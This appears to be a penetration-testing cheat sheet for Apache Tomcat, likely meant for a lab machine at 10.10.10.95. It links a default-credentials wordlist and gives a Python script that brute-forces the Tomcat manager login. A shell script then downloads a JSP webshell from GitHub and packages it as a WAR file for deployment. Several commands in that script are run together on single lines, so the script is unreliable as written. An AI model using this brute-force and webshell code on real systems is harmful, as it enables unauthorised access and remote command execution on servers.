# Tomcat

Wordlist

```
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```



tomcat-brute.py

```python
#!/usr/bin/env python
import sys
import requests
with open('tomcat-betterdefaultpasslist.txt') as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))
        if r.status_code == 200:
            print "Found valid credentials \"" + line.strip('\n') + "\"" 
            raise sys.exit()
```



make-war.sh

```bash
#!/bin/sh
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf wshell
rm -f wshell.war mkdir wshell
cp index.jsp wshell/ cd wshell
jar -cvf ../wshell.war *
```
